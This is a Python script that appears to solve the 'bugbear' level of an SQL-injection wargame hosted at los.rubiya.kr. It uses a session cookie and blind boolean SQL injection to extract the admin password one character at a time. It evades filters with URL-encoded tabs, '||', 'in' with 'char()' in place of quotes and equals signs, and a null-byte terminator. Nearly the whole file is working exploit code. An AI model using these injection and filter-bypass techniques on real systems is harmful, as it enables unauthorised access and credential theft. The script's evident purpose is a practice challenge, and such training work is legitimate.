import requests as req

flag = ""
length = 0

url = "https://los.rubiya.kr/chall/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php?no="
session = dict(PHPSESSID = "e3cj1ei61p0q12g7kfekpc3vbr")

print("[+] Start")
print("[+] Find length")

for i in range(0, 20):
    try:
        query = url + "12345%09||%09length(pw)%09in%09("+str(i)+");%00"
        res = req.post(query, cookies = session)

    except:
        print("[-] Error occur")
        continue

    if 'Hello admin' in res.text:
        length = i
        print("[+] Find length")
        break

print("[+] length : ", length)
print("[+] Find password")

for i in range(0, length+1):
    for j in range(48, 128):
        try:
            query = url + "12345%09||%09mid(pw," + str(i) + ",1)%09in%09char(" + str(j) + ");%00"
            res = req.post(query, cookies = session)

        except:
            print("[-] Error occur")
            continue

        if 'Hello admin' in res.text:
            flag += chr(j)
            print ("[+] Found : " + str(i), " : ", flag)
            break;

print ("[+] flag : ", flag)
